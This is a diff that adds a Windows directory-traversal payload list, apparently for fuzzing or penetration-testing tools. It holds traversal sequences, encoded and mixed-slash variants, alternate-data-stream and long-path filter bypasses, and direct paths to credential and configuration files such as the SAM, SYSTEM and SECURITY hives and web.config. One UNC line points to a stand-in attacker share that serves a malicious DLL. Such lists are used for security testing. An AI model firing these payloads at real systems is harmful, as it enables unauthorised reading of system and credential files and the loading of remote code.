@@ -1,0 +1,60 @@
+# ============================================================
+# Directory Traversal — Windows
+# ============================================================
+
+# ---- Basic Windows Backslash ----
+..\
+..\..\
+..\..\..\
+..\..\..\..\
+
+# ---- Mixed Slash ----
+..\../
+..\/
+..\./
+./..\..\
+
+# ---- Windows Absolute Paths ----
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\sam
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\SECURITY
+C:\inetpub\wwwroot\web.config
+C:\inetpub\wwwroot\global.asa
+C:\Windows\repair\sam
+C:\boot.ini
+C:\Windows\debug\NetSetup.log
+C:\WINDOWS\system32\inetsrv\config\applicationHost.config
+
+# ---- Relative Traversal to Windows Files ----
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+
+# ---- Windows UNC Paths ----
+\\ATTACKER\share\malicious.dll
+\\127.0.0.1\c$\windows\win.ini
+\\%5c%5c127.0.0.1%5cc$%5cwindows%5cwin.ini
+
+# ---- Drive Letter Enumeration ----
+C:/
+D:/
+E:/
+../C:/
+..\C:\
+
+# ---- Windows URL Encoding ----
+..%5c..%5c
+..%5c
+%2e%2e%5c
+%2e%2e%5c%2e%2e%5c
+%2e%2e%5cwindows%5cwin.ini
+
+# ---- Alternate Data Streams ----
+../../../windows/win.ini::$DATA
+../../file.txt::$DATA
+
+# ---- Long Path (260+ chars filter bypass) ----
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
